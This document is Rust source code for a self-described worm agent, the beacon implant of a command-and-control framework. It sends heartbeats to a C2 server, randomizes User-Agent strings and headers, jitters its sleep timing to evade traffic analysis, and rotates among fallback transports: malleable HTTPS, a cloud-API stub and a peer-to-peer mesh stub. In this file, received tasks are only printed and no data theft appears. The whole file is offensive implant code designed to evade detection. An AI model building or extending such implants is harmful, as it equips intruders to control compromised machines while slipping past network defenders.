// Project: Hydra-Worm Agent
// Phase: 1.4 - Malleable Profile Integration
// Logic: Temporal Evasion + Header Randomization + C2 Synchronization

use std::{thread, time::Duration};
use rand::Rng;
use rand::seq::SliceRandom;
use rand_distr::{Distribution, Exp};
use serde::{Serialize, Deserialize};
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, ACCEPT, ACCEPT_LANGUAGE};

// --- TELEMETRY STRUCTURES (Synced with Go Orchestrator) ---

#[derive(Serialize, Clone)]
struct Telemetry {
    agent_id: String, // Matches Go json:"agent_id"
    transport: String,
    status: String,
    lambda: f64,
}

#[derive(Deserialize)]
struct C2Response {
    status: String,
    task: String,
    epoch: i64,
}

// --- MALLEABLE PROFILE ENGINE ---

struct MalleableProfile {
    user_agent: String,
    hydra_key: String,
    headers: HeaderMap,
}

impl MalleableProfile {
    fn new() -> Self {
        let mut rng = rand::thread_rng();
        
        let uas = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ];

        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
        
        let key: String = (0..8).map(|_| rng.gen_range(b'A'..=b'Z') as char).collect();

        Self {
            user_agent: uas.choose(&mut rng).unwrap().to_string(),
            hydra_key: key,
            headers,
        }
    }
}

// --- TRANSPORT TRAIT ---

trait Transport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String>;
    fn get_name(&self) -> String;
}

// --- TRANSPORT TIER 2: MALLEABLE HTTPS ---

struct MalleableHttps { 
    c2_url: String 
}

impl Transport for MalleableHttps {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let profile = MalleableProfile::new();
        
        let client = reqwest::blocking::Client::builder()
            .use_rustls_tls()
            // PATCH: Removed http2_prior_knowledge() to resolve "broken pipe" 404s
            .timeout(Duration::from_secs(5))
            .build()
            .map_err(|e: reqwest::Error| e.to_string())?;

        let response = client.post(&self.c2_url)
            .headers(profile.headers.clone())
            .header(USER_AGENT, &profile.user_agent)
            .header("X-Hydra-Key", &profile.hydra_key)
            .json(stats)
            .send()
            .map_err(|e: reqwest::Error| format!("Network Error: {}", e))?;

        if response.status().is_success() {
            let body: C2Response = response.json()
                .map_err(|e: reqwest::Error| e.to_string())?;
            
            println!("[+] Malleable Success | Profile: [UA: {}] [Key: {}]", profile.user_agent, profile.hydra_key);
            Ok(body)
        } else {
            Err(format!("HTTP Error: {}", response.status()))
        }
    }
    fn get_name(&self) -> String { "Malleable-HTTPS".into() }
}

// --- OTHER TRANSPORTS (Tier 1 & Tier 3 Placeholder) ---

struct CloudTransport { endpoint: String }
impl Transport for CloudTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
        println!("[!] C2-CLOUD: Mocking connection to {}...", self.endpoint);
        Err("Switching to Tier 2...".into())
    }
    fn get_name(&self) -> String { "Cloud-API".into() }
}

struct P2PTransport;
impl Transport for P2PTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
        println!("[!] C2-P2P: Broadcasting to local mesh...");
        Err("Tier 3 - Mesh discovery active".into())
    }
    fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
}

// --- CORE AGENT ENGINE ---

struct Agent {
    id: String,
    transport: Box<dyn Transport>,
    failures: u32,
    state: u8,
    lambda: f64,
}

impl Agent {
    fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            transport: Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
            failures: 0,
            state: 1, 
            lambda: 0.2, 
        }
    }

    fn run(&mut self) {
        loop {
            let stats = Telemetry {
                agent_id: self.id.clone(),
                transport: self.transport.get_name(),
                status: "OK".into(),
                lambda: self.lambda,
            };

            match self.transport.send_heartbeat(&stats) {
                Ok(res) => {
                    println!("[+] C2 Task: {} | Epoch: {}", res.task, res.epoch);
                    self.failures = 0;
                },
                Err(e) => {
                    println!("[-] Failure: {}", e);
                    self.failures += 1;
                }
            }

            if self.failures >= 3 { self.mutate(); }

            // NHPP Jitter Engine
            let exp = Exp::new(self.lambda).unwrap();
            let sleep_time = exp.sample(&mut rand::thread_rng()).min(60.0).max(1.0);
            thread::sleep(Duration::from_secs_f64(sleep_time));
        }
    }

    fn mutate(&mut self) {
        self.state = (self.state + 1) % 3;
        self.failures = 0;
        println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);

        self.transport = match self.state {
            0 => Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
            1 => Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
            _ => Box::new(P2PTransport),
        };
    }
}

fn display_splash() {
    println!(r#"
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ `/   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    "#);
    println!("      [ Phase 1.4 - Malleable Profile Active ]\n");
}

fn main() {
    display_splash();
    let mut agent = Agent::new("HYDRA-AGENT-01");
    agent.run();
}